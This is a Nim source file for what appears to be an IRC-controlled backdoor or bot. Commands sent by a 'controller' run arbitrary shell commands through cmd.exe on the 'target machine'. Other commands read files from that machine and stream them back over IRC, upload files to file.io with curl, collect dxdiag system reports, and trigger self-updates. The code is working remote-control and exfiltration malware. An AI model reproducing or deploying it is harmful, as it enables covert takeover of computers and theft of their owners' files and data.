import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asyncdispatch

let
    g_dbg* = true
    g_msg_length = 400
    g_msg_send_time = 2 #seconds
    g_msg_max_transfer_time = 20



type
    ExecRespose = tuple
        exitCode:int
        output:string



proc helper_secondsToMinutesAndSeconds(seconds: int): Future[string] {.async.} =
    let minutes = seconds div 60
    let remainingSeconds = seconds mod 60
    return $minutes & "min " & $remainingSeconds & "sec"



## Recombine trailing tokens
## Required if the parameter is just one long string that included spaces
proc helper_recombine(tokens:seq[string], start = 1):Future[string] {.async.} =
    var first = true
    for i in start..<len(tokens):
        if first:
            result &= tokens[i]
            first = false
        else:
            result &= " " & tokens[i]



## Slice a long message into an array of strings that fit the message length limit
proc helper_chopString(victim:string):Future[seq[string]] {.async.} =
    var i:int
    while i < len(victim):
        if i+g_msg_length < len(victim):
            result.add(victim[i..i+g_msg_length])
        else:
            result.add(victim[i..high(victim)])
            break
        i+=g_msg_length+1



## Check to see if a message will take a long time to display be sent
## User will be informed of duration and what to do if it breaches the max transfer time
proc helper_checkSendDuration(event: IrcEvent, client:AsyncIrc, msg:string): Future[bool] {.async.} =
    var
        transfer_linecount:int = 0
        transfer_duration:int
        transfer_durStr:string
        transfer_lines:seq[string]

    for line in msg.splitLines():
        transfer_lines.add(line)
        transfer_linecount += int(math.floor(len(line) / g_msg_length)) + 1
    
    transfer_duration = transfer_linecount * g_msg_send_time
    transfer_durStr = await helper_secondsToMinutesAndSeconds(transfer_duration)


    discard client.privmsg(event.origin, "DATA incoming, no. of messages: " & $transfer_linecount & ", ~duration: " & transfer_durStr)

    if (transfer_duration > g_msg_max_transfer_time):
        discard client.privmsg(event.origin, "WARNING: the transfer will take more than " & $g_msg_max_transfer_time & "s. you need to force this command using '!' as the last token")
        return false
    else:
        return true



proc rexec_runCommand(cmd:string):Future[ExecRespose] {.async.} =
    var 
        output:string
        exitcode:int    
    (output, exitcode) = execCmdEx("cmd.exe /c " & cmd, options = {poUsePath})
    result.output = output
    result.exitCode = exitcode



## Because just using cd with execCmdEx doesnt do anything
proc rexec_changeDir(path:string):Future[bool] {.async.} =
    if os.dirExists(path):
        os.setCurrentDir(path)
        return true
    else:
        return false





## Uploads target file from target machine to file.io, sends link to controller
proc cmd_getFileIO(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) {.async.} = 
    var filename = await helper_recombine(tokens,1)

    if fileExists(filename):
        try:
            var
                (output, _ ) = execCmdEx("cmd.exe /C curl -sF  \"file=@./" & filename & "\" \"https://file.io?expires=1h\"")
                trash:string
                i:int = 0

            while output[i] != '{':
                trash &= output[i]
                inc(i)

            output = output.replace(trash, "")

            if output.contains("success\":true"):
                try:
                    var json_data = parseJson(output)
                    var download_link = json_data["link"].str
                    client.privmsg(event.origin, "you have 1 hour: " & download_link)
                except:
                    client.privmsg(event.origin, "parsing error, you have 1 hour: " & output)
            else:
                client.privmsg(event.origin, "failed: " & output)
        except:
            client.privmsg(event.origin, "you just crashed the whole thing with that")
    else:
        if g_dbg: echo "File missing"
        client.privmsg(event.origin, "i dont see it")



## Downloads the specified file, compresses it as .gz and sends it encoded as base64
## A very slow file transfer, maybe implement DCC somehow??
proc cmd_get(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) {.async.} = 
    var filename = await helper_recombine(tokens,1)

    if fileExists(filename):
        if g_dbg: echo "Opening file"
        var file = open(filename)
        var filestr = file.readAll()

        var cfile = compress(filestr)
        var b64_cfile = encode(cfile)
        
        if(not (await helper_checkSendDuration(event, client, b64_cfile)) and not force):
            return

        var i = 0

        while i < len(b64_cfile):
            if i+g_msg_length < len(b64_cfile):
                discard client.privmsg(event.origin, b64_cfile[i..i+g_msg_length])
            else:
                discard client.privmsg(event.origin, b64_cfile[i..high(b64_cfile)])
                break
            i+=g_msg_length+1
        close(file)

        client.privmsg(event.origin, "DATA transfer complete")
    else:
        if g_dbg: echo "File missing"
        client.privmsg(event.origin, "that did not work out")



## Similar to cmd_get, but sends the file's contents as plain text
proc cmd_print(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) {.async.} = 
    var filename = await helper_recombine(tokens,1)

    if fileExists(filename):
        var file = open(filename)
        var filestr = file.readAll()
            
        if(not (await helper_checkSendDuration(event, client, fileStr)) and not force):
            return

        for line in filestr.splitLines():
            if strip(line) == "": continue
            if len(line) > g_msg_length:
                var line_copped = await helper_chopString(line)
                for morsel in line_copped:
                    discard client.privmsg(event.origin, morsel)
            else:
                discard client.privmsg(event.origin, line)

        close(file)

        client.privmsg(event.origin, "DATA transfer complete")
    else:
        if g_dbg: echo "File missing"
        client.privmsg(event.origin, "that did not work out")



## Runs dxdiag and sends the output text file using cmd_get
proc cmd_dxdiag(event:IrcEvent, client:AsyncIrc) {.async.} =
    discard client.privmsg(event.origin,"one moment")
    if g_dbg: echo "Starting dxdiag"
    var 
        cmd:string = "cmd.exe /c dxdiag /dontskip /t dxdiag_file.txt"
        outputx:string
        exitcodex:int
    (outputx,exitcodex) = execCmdEx(cmd, options = {poUsePath})

    if g_dbg: echo "Checking file"
    await cmd_get(event, client, @["dxdiag_file.txt"], true)
    removeFile("dxdiag_file.txt")

    if g_dbg: echo "Dxdiag command done"


proc cmd_responseHandler(response:Future[ExecRespose], client:AsyncIrc, event:IrcEvent) {.async.} =
    while not response.finished() and not response.failed():
        await sleepAsync(1000)
    
    if not response.failed():
        if response.read().exitCode == 0:
            var value:string = response.read().output
            for line in value.splitLines():
                discard client.privmsg(event.origin, line)
        else:
            discard client.privmsg(event.origin, "Error [ "  & $response.read().exitCode & " ]")
    else:
        discard client.privmsg(event.origin, "cmd: future failed")



## Processes !rexec
## Contains some shortcuts for certain functions, everything else just gets sent to rexec_runCommand
proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
    if len(tokens) < 2:
        discard client.privmsg(event.origin, "too short")
        return

    var
        response:ExecRespose
        caught:bool = false

    case tokens[1]:
    of "cd":
        if len(tokens) == 2:
            #response = await rexec_runCommand("echo %CD%")
            discard cmd_responseHandler(rexec_runCommand("echo %CD%"), client, event)
            #caught = true
        else:
            var path = await helper_recombine(tokens,2)
            if await rexec_changeDir(path):
                caught = true
                discard client.privmsg(event.origin, "cwd: " & path)
            else:
                discard client.privmsg(event.origin, "cwd: no such directory")


    of "cd..":
        #response = await rexec_runCommand("cd ..")
        discard cmd_responseHandler(rexec_runCommand("cd .."), client, event)
        #caught = true
    of "ls":
        #response = await rexec_runCommand("dir /w")
        discard cmd_responseHandler(rexec_runCommand("dir /w"), client, event)
        #caught = true
    else:
        var args:string
        args = await helper_recombine(tokens)
        
        if g_dbg: echo "ARGS: " & args

        discard cmd_responseHandler(rexec_runCommand(args), client, event)

    # if caught:
    #     for line in response.output.splitLines():
    #         client.privmsg(event.origin, line)



## Checks if a private message was a command and calls appropriate functions
proc cmdh_handle*(event:IrcEvent, client:AsyncIrc) {.async.} =
    var
        msg = event.params[event.params.high]
        tokens:seq[string]

    if g_dbg: echo "MSG: ", msg

    for token in msg.tokenize():
        if not token.isSep:
            tokens.add(token.token)

    case tokens[0]:
    of "!hey": discard client.privmsg(event.origin, "heyyy v" & $current_version)
    of "!lag": discard client.privmsg(event.origin, formatFloat(client.getLag))
    of "!excessFlood":
        for i in 0..10:
            discard client.privmsg(event.origin, "TEST" & $i)
    of "!dxdiag":
        discard cmd_dxdiag(event, client)
    of "!r": #remote execution
        discard cmd_rexec(event, client, tokens)
    of "!getfio":
        discard cmd_getFileIO(event, client, tokens, false)
    of "!get":
        if tokens[high(tokens)] == "!":
            var ftokens = tokens
            ftokens.delete(high(tokens))
            discard cmd_get(event, client, ftokens, true)
        else:
            discard cmd_get(event, client, tokens, false)
    of "!print":
        if tokens[high(tokens)] == "!":
            var ftokens = tokens
            ftokens.delete(high(tokens))
            discard cmd_print(event, client, ftokens, true)
        else:
            discard cmd_print(event, client, tokens, false)
    of "!update":
        discard updt_check(true , client, event)
            
        